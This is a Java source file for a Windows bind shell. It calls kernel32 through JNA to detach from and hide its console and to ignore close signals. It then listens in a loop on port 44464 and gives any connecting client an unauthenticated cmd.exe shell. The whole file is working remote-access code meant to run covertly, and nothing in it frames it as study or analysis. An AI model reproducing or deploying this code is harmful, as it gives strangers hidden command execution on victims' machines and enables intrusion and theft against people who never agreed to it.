import com.sun.jna.*;
import com.sun.jna.win32.*;
import java.io.*;
import java.net.*;

public class BindShell {

    // Detach from console and suppress ctrl+break
    public interface Kernel32 extends StdCallLibrary {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class, W32APIOptions.DEFAULT_OPTIONS);
        boolean FreeConsole();
        boolean SetConsoleCtrlHandler(HandlerRoutine handler, boolean add);
        interface HandlerRoutine extends StdCallCallback {
            boolean callback(int dwCtrlType);
        }
    }

    public static void main(String[] args) {
        // Hide the console window and ignore close events
        Kernel32.INSTANCE.FreeConsole();
        Kernel32.INSTANCE.SetConsoleCtrlHandler(null, true);

        int port = 44464;

        while (true) {
            try (ServerSocket serverSocket = new ServerSocket(port)) {
                System.out.println("[*] Listening on port " + port + "...");

                while (true) {
                    Socket clientSocket = serverSocket.accept();
                    System.out.println("[*] Connection from " + clientSocket.getInetAddress());

                    // Start new thread to handle connection
                    new Thread(() -> handleClient(clientSocket)).start();
                }

            } catch (IOException e) {
                // If bind fails, wait and try again (e.g., if port temporarily taken)
                try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
            }
        }
    }

    private static void handleClient(Socket clientSocket) {
        try {
            // Launch new cmd shell
            Process process = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();

            InputStream processOut = process.getInputStream();
            OutputStream processIn = process.getOutputStream();

            InputStream clientIn = clientSocket.getInputStream();
            OutputStream clientOut = clientSocket.getOutputStream();

            // Shell output → client
            Thread outputThread = new Thread(() -> {
                try {
                    byte[] buffer = new byte[1024];
                    int read;
                    while ((read = processOut.read(buffer)) != -1) {
                        clientOut.write(buffer, 0, read);
                        clientOut.flush();
                    }
                } catch (IOException ignored) {}
            });
            outputThread.setDaemon(true);
            outputThread.start();

            // Client input → shell
            byte[] buffer = new byte[1024];
            int read;
            while ((read = clientIn.read(buffer)) != -1) {
                processIn.write(buffer, 0, read);
                processIn.flush();
            }

            // Clean up
            process.destroy();
            clientSocket.close();
        } catch (IOException ignored) {}
    }
}
